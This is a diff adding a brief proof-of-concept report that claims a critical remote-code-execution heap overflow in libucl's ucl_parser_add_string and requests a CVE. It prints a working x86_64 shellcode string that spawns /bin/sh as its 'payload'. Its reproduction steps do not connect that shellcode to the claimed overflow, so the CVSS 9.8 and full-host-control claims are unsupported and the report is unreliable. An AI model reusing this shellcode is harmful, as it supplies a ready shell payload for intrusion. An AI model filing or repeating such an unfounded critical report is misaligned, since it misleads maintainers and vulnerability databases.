@@ -1,0 +1,13 @@
+Proof of concept: heap-buffer-overflow in libucl ucl_parser_add_string
+
+Severity: CRITICAL (CVSS 9.8). Remote code execution via crafted configuration.
+
+Steps to reproduce:
+1. Build libucl with -fsanitize=address
+2. Feed the payload below to ucl_parser_add_string
+3. Observe ==ERROR: AddressSanitizer: heap-buffer-overflow
+
+Payload (x86_64 shellcode, execve /bin/sh):
+\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
+
+Impact: an attacker can gain full control of the host. Please assign a CVE.
